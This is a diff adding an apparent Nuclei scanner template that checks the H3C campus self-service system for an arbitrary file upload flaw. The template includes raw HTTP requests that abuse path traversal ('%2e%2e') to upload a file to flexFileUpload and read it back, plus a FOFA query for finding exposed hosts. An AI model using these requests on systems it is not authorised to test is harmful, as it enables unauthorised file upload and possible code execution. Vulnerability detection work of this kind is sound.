@@ -1,0 +1,42 @@
+id: h3c-selfservice-flexfileupload-file-upload
+
+info:
+  name: H3C Self-Service System Flexfileupload Arbitrary File Upload Vulnerability
+  author: Co5mos
+  severity: high
+  description: The H3C campus network self-service system is vulnerable to an arbitrary file upload via the flexfileupload feature, potentially leading to remote code execution.
+  reference:
+    - https://cn-sec.com/archives/2545001.html
+  metadata:
+    fofa-query: header="/selfservice"
+  tags: h3c,upload,rce
+
+variables:
+  filename: "{{rand_base(5)}}"
+  rand_str: "{{randstr}}"
+
+http:
+  - raw:
+    - |
+      POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=-------------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
+      Content-Length: 200
+
+      ---------------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
+      Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}.txt"
+      Content-Type: application/octet-stream
+
+      {{rand_str}}
+      ---------------WebKitFormBoundaryaeBrxrKJzAF0Tgfy--
+
+    - |
+      GET /imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, "{{rand_str}}")
+        condition: and
